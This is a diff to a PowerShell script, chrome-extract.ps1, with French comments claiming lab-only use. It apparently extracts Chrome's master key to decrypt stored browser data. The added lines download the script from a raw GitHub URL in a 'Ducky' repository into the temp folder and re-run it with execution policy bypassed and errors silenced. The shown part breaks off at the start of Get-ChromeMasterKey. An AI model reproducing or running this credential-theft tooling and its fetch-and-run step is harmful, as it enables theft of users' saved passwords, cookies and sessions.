@@ -1,14 +1,25 @@
 # Lab / machine autorisee uniquement. Cibles Google Chrome (Chromium).
 # Utilise pwsh 7+ (AesGcm) et sqlite3 dans PATH.
+param(
+    [string]$ScriptSourceUrl = 'https://raw.githubusercontent.com/BL4CK-SUN/Ducky/main/chrome-extract.ps1'
+)
+
 $ErrorActionPreference = 'SilentlyContinue'
 
 if ($PSVersionTable.PSVersion.Major -lt 7) {
+    $pwsh = (Get-Command pwsh -ErrorAction SilentlyContinue).Source
+    if (-not $pwsh) { throw 'PowerShell 7 requis (AesGcm). Installe pwsh ou lance via leonardo-plan-a.ps1.' }
     $self = $MyInvocation.MyCommand.Path
-    if ($self -and (Get-Command pwsh -ErrorAction SilentlyContinue)) {
-        & pwsh -NoProfile -ExecutionPolicy Bypass -File $self @args
-        exit $LASTEXITCODE
+    if (-not $self -or -not (Test-Path -LiteralPath $self)) {
+        $self = Join-Path $env:TEMP 'chrome-extract.ps1'
+        try {
+            Invoke-WebRequest -Uri $ScriptSourceUrl -UseBasicParsing -OutFile $self
+        } catch {
+            throw "PowerShell 7 requis ; re-telechargement echoue : $($_.Exception.Message)"
+        }
     }
-    throw 'PowerShell 7 requis (AesGcm).'
+    & $pwsh -NoProfile -ExecutionPolicy Bypass -File $self @args
+    exit $LASTEXITCODE
 }
 
 function Get-ChromeMasterKey {
